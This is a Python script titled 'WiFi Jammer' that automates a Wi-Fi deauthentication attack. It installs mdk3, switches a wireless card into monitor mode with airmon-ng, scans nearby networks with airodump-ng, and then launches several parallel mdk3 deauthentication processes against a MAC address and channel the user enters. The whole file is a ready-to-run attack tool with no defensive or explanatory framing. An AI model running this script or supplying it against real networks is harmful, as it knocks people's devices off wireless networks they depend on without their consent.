import os
import sys
import subprocess
import time
from colorama import Fore, Style

def run_wifi_jammer():
    def print_banner():
        print(f"{Fore.GREEN}  .     {Fore.LIGHTBLACK_EX}     {Style.RESET_ALL}{Fore.GREEN}     .    {Style.RESET_ALL}")
        print(f"{Fore.GREEN}.´  ·  .{Fore.LIGHTBLACK_EX}     {Style.RESET_ALL}{Fore.GREEN}.  ·  `.  {Fore.GREEN}WiFi Jammer{Style.RESET_ALL}")
        print(f"{Fore.GREEN}:  :  : {Fore.LIGHTBLACK_EX} (¯) {Style.RESET_ALL}{Fore.GREEN} :  :  :  {Style.RESET_ALL}")
        print(f"{Fore.GREEN}`.  ·  `{Fore.LIGHTBLACK_EX} /¯\\ {Style.RESET_ALL}{Fore.GREEN}´  ·  .´  {Style.RESET_ALL}")
        print(f"{Fore.GREEN}  `     {Fore.LIGHTBLACK_EX}/¯¯¯\\{Style.RESET_ALL}{Fore.GREEN}     ´    {Style.RESET_ALL}")
        print()

    def check_and_install_mdk3():
        print_banner()
        print(f"{Fore.YELLOW}Checking for mdk3...{Style.RESET_ALL}")
        try:
            result = subprocess.run(
                ["which", "mdk3"], stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )
            if result.returncode != 0 or not result.stdout.strip():
                print(f"{Fore.RED}mdk3 is not installed.{Style.RESET_ALL}")
                install = input(f"{Fore.YELLOW}Do you want to install mdk3? (yes/no): {Style.RESET_ALL}").strip().lower()
                if install in ["yes", "y"]:
                    print(f"{Fore.YELLOW}Updating and upgrading system...{Style.RESET_ALL}")
                    subprocess.run(["sudo", "apt-get", "update"], check=True)
                    subprocess.run(["sudo", "apt-get", "upgrade", "-y"], check=True)
                    print(f"{Fore.YELLOW}Installing mdk3...{Style.RESET_ALL}")
                    subprocess.run(["sudo", "apt-get", "install", "-y", "mdk3"], check=True)
                else:
                    print(f"{Fore.RED}Exiting as mdk3 is required.{Style.RESET_ALL}")
                    sys.exit(1)
            else:
                print(f"{Fore.GREEN}mdk3 is already installed.{Style.RESET_ALL}")
        except subprocess.CalledProcessError as e:
            print(f"{Fore.RED}Error checking or installing mdk3: {e}{Style.RESET_ALL}")

    def get_network_interface():
        print(f"{Fore.GREEN}Displaying network interfaces...{Style.RESET_ALL}")
        subprocess.run(["iwconfig"], check=True)
        interface = input(f"{Fore.GREEN}Enter the network interface to use (e.g., wlan0): {Style.RESET_ALL}").strip()

        if not interface:
            print(f"{Fore.RED}Invalid interface name.{Style.RESET_ALL}")
            sys.exit(1)

        def is_monitor_mode(interface):
            result = subprocess.run(
                ["iwconfig", interface], stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )
            return "Mode:Monitor" in result.stdout.decode()

        def set_monitor_mode(interface):
            print(f"{Fore.YELLOW}Switching {interface} to monitor mode...{Style.RESET_ALL}")
            try:
                subprocess.run(["sudo", "ifconfig", interface, "down"], check=True)
                subprocess.run(["sudo", "airmon-ng", "check", "kill"], check=True)
                subprocess.run(["sudo", "airmon-ng", "start", interface], check=True)
                subprocess.run(["sudo", "ifconfig", interface, "up"], check=True)
                print(f"{Fore.GREEN}{interface} is now in monitor mode.{Style.RESET_ALL}")
            except subprocess.CalledProcessError as e:
                print(f"{Fore.RED}Error setting monitor mode: {e}{Style.RESET_ALL}")
                sys.exit(1)

        if not is_monitor_mode(interface):
            set_monitor_mode(interface)

        return interface

    def run_wifi_tools(interface):
        while True:
            try:
                print(f"{Fore.GREEN}Select frequency band to scan:{Style.RESET_ALL}")
                print("1. 2.4GHz")
                print("2. 5GHz") 
                print("3. Both")
                print("4. Custom Channel Range")
                freq_choice = input(f"{Fore.GREEN}Enter your choice (1-4): {Style.RESET_ALL}").strip()

                scan_command = []
                if freq_choice == "1":
                    scan_command = ["sudo", "airodump-ng", "--band", "bg", interface]
                    print(f"{Fore.GREEN}Opened scan window for 2.4GHz band{Style.RESET_ALL}")
                
                elif freq_choice == "2":
                    scan_command = ["sudo", "airodump-ng", "--band", "a", interface]
                    print(f"{Fore.GREEN}Opened scan window for 5GHz band{Style.RESET_ALL}")
                
                elif freq_choice == "3":
                    scan_command = ["sudo", "airodump-ng", "--band", "abg", interface]
                    print(f"{Fore.GREEN}Opened scan window for both 2.4GHz and 5GHz bands{Style.RESET_ALL}")
                
                elif freq_choice == "4":
                    start_ch = input(f"{Fore.GREEN}Enter start channel: {Style.RESET_ALL}")
                    end_ch = input(f"{Fore.GREEN}Enter end channel: {Style.RESET_ALL}")
                    scan_command = ["sudo", "airodump-ng", "--channel", f"{start_ch}-{end_ch}", interface]
                    print(f"{Fore.GREEN}Opened scan window for channels {start_ch}-{end_ch}{Style.RESET_ALL}")
                
                else:
                    print(f"{Fore.RED}Invalid choice. Please select 1-4.{Style.RESET_ALL}")
                    continue

                subprocess.Popen(["gnome-terminal", "--"] + scan_command)

                time.sleep(2)
                handle_blacklist_whitelist(interface)

                scan_again = input(f"{Fore.GREEN}Do you want to scan again? (yes/no): {Style.RESET_ALL}").strip().lower()
                if scan_again not in ['yes', 'y']:
                    break

            except subprocess.CalledProcessError as e:
                print(f"{Fore.RED}Error running Wi-Fi tools: {e}{Style.RESET_ALL}")
                return

    def handle_blacklist_whitelist(interface):
        while True:
            macid_raw = input(f"{Fore.GREEN}Enter a target MAC address: {Style.RESET_ALL}").strip().lower()

            if len(macid_raw) != 12 or not all(c in '0123456789abcdef' for c in macid_raw):
                print(f"{Fore.RED}Invalid MAC address format. Please enter exactly 12 hexadecimal characters.{Style.RESET_ALL}")
                continue

            macid = ":".join(macid_raw[i:i + 2].upper() for i in range(0, len(macid_raw), 2))
            print(f"{Fore.GREEN}Target MAC address: {macid}{Style.RESET_ALL}")

            ch = input(f"{Fore.GREEN}Enter Target Channel (CH): {Style.RESET_ALL}").strip()
            while not ch.isdigit() or not (1 <= int(ch) <= 165):
                print(f"{Fore.RED}Invalid channel. Please enter a channel number between 1 and 165.{Style.RESET_ALL}")
                ch = input(f"{Fore.GREEN}Enter Target Channel (CH): {Style.RESET_ALL}").strip()

            num_terminals = input(f"{Fore.GREEN}Enter the number of terminals to open: {Style.RESET_ALL}").strip()
            while not num_terminals.isdigit() or int(num_terminals) < 1:
                print(f"{Fore.RED}Invalid number. Please enter a positive integer.{Style.RESET_ALL}")
                num_terminals = input(f"{Fore.GREEN}Enter the number of terminals to open: {Style.RESET_ALL}").strip()

            num_terminals = int(num_terminals)

            try:
                for i in range(num_terminals):
                    print(f"{Fore.YELLOW}Opening terminal {i + 1} to deauthenticate {macid} on channel {ch}...{Style.RESET_ALL}")
                    subprocess.Popen(["xterm", "-e", "mdk3", interface, "d", "-c", ch, "-m", macid])
                print(f"{Fore.GREEN}mdk3 is now running in {num_terminals} terminals to deauthenticate {macid}. Press Ctrl+C to stop all.{Style.RESET_ALL}")
                break
            except subprocess.CalledProcessError as e:
                print(f"{Fore.RED}Error running mdk3: {e}{Style.RESET_ALL}")
                return

    try:
        check_and_install_mdk3()
        interface = get_network_interface()
        run_wifi_tools(interface)

    except KeyboardInterrupt:
        print(f"{Fore.RED}Exiting the WiFi Jammer.{Style.RESET_ALL}")
        sys.exit(0)

if __name__ == "__main__":
    run_wifi_jammer()
